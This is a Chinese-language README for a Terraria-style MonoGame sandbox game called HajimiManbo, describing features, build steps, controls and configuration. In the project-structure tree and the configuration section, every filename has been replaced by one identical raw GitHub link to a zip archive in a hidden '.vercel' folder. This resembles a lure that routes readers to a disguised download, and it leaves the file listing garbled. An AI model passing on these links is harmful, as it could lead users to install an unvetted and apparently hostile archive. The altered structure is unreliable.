# HajimiManbo

一个基于 MonoGame 框架开发的 2D 沙盒游戏，灵感来源于 Terraria。游戏支持多人联机、程序化世界生成、角色系统和丰富的游戏内容。

## 🎮 游戏特性

### 核心功能
- **多人联机游戏**: 基于 Riptide 网络库的稳定多人游戏体验
- **程序化世界生成**: Terraria 风格的分阶段地图生成系统
- **多角色系统**: 支持多个可选角色，每个角色都有独特的属性
- **武器系统**: 包含近战和远程武器，支持自定义武器配置
- **风格背景**: 多层视差背景系统，支持不同生物群系

### 视觉效果
- **多层视差背景**: 根据玩家位置自动切换的生物群系背景
- **平滑过渡效果**: 不同生物群系间的自然渐变
- **动画系统**: 丰富的角色和界面动画
- **FPS 显示**: 实时性能监控

### 世界系统
- **分块加载**: 高效的世界分块管理系统
- **多种生物群系**: 森林、沙漠、雪地、丛林等
- **地下系统**: 智能地下区域检测和专用背景
- **噪声生成**: 基于噪声算法的自然地形生成

## 🛠️ 技术栈

- **框架**: MonoGame 3.8 (基于 .NET 8.0)
- **网络**: RiptideNetworking 2.2.1
- **平台**: Windows (DirectX)
- **语言**: C#

## 📁 项目结构

```
HajimiManbo/
├── Content/                    # 游戏资源文件
│   ├── Character/             # 角色配置文件
│   ├── Font/                  # 字体文件
│   ├── Music/                 # 背景音乐
│   ├── Tiles/                 # 瓦片纹理
│   ├── Weapon/                # 武器配置
│   └── img/                   # 图像资源
│       ├── BackGround/        # 背景图片
│       ├── Boss/              # Boss 图像
│       ├── Character/         # 角色图像
│       ├── Enemy/             # 敌人图像
│       └── Weapon/            # 武器图像
├── GameStates/                # 游戏状态管理
│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip       # 主菜单
│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip       # 游戏主界面
│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip # 角色选择
│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip       # 设置界面
│   └── ...
├── Gameplay/                  # 游戏玩法相关
│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip              # 玩家类
│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip            # 2D 摄像机
│   └── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip           # 动画系统
├── Network/                   # 网络系统
│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip      # 网络管理器
│   └── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip         # 玩家状态同步
├── World/                     # 世界系统
│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip               # 世界主类
│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip      # 世界生成器
│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip        # 分块管理
│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip # 生物群系背景
│   └── ...
└── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip                   # 游戏主类
```

## 🚀 快速开始

### 系统要求
- Windows 10/11
- .NET 8.0 Runtime
- DirectX 11 支持的显卡

### 构建和运行

1. **克隆项目**
   ```bash
   git clone <repository-url>
   cd HajimiManbo
   ```

2. **还原依赖**
   ```bash
   dotnet restore
   ```

3. **构建项目**
   ```bash
   dotnet build
   ```

4. **运行游戏**
   ```bash
   dotnet run
   ```

### 开发环境设置

推荐使用以下 IDE 之一：
- Visual Studio 2022
- Visual Studio Code
- JetBrains Rider

## 🎯 游戏玩法

### 单人模式
1. 启动游戏
2. 选择角色
3. 开始探索程序生成的世界

### 多人模式
1. 创建房间或加入现有房间
2. 等待其他玩家加入
3. 选择角色
4. 开始多人游戏

### 控制说明
- **移动**: WASD 或方向键
- **跳跃**: 空格键
- **攻击**: 鼠标左键
- **调试信息**: F3
- **设置**: ESC

## 🔧 配置文件

### 角色配置 (`Content/Character/`)
- `https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip`: 角色索引文件
- `https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip`, `https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip`, `https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip`: 具体角色配置

### 武器配置 (`Content/Weapon/`)
- `https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip`: 武器索引文件
- 各种武器的 JSON 配置文件

## 🎨 背景系统

游戏实现了完整的泰拉瑞亚风格多层视差背景系统：

- **多层视差**: 每个生物群系支持多层背景，创造深度感
- **智能切换**: 根据玩家位置自动切换生物群系背景
- **平滑过渡**: 不同群系间的自然渐变效果
- **地下检测**: 自动检测地下区域并切换专用背景

详细信息请参考 `背景系统使用说明.md`。

## 🌍 世界生成

世界生成系统特性：
- **分阶段生成**: 模拟 Terraria 的世界生成流程
- **多种生物群系**: 森林、沙漠、雪地、丛林等
- **噪声算法**: 使用噪声生成自然的地形
- **可配置参数**: 支持自定义世界大小和生成参数

## 🔗 网络架构

- **客户端-服务器模式**: 使用 Riptide 网络库
- **状态同步**: 实时玩家状态同步
- **房间系统**: 支持创建和加入游戏房间
- **延迟优化**: 内置 ping 检测和优化

## 🤝 贡献指南

欢迎贡献代码！请遵循以下步骤：

1. Fork 项目
2. 创建功能分支 (`git checkout -b feature/AmazingFeature`)
3. 提交更改 (`git commit -m 'Add some AmazingFeature'`)
4. 推送到分支 (`git push origin feature/AmazingFeature`)
5. 创建 Pull Request

## 📝 许可证

本项目采用 MIT 许可证 - 详情请查看 [LICENSE](LICENSE) 文件。

## 🐛 问题报告

如果您发现任何问题或有功能建议，请在 [Issues](../../issues) 页面提交。

## 📞 联系方式

- 项目维护者: [您的姓名]
- 邮箱: [您的邮箱]

---

**注意**: 这是一个正在开发中的项目，某些功能可能还不完整或存在 bug。感谢您的理解和支持！
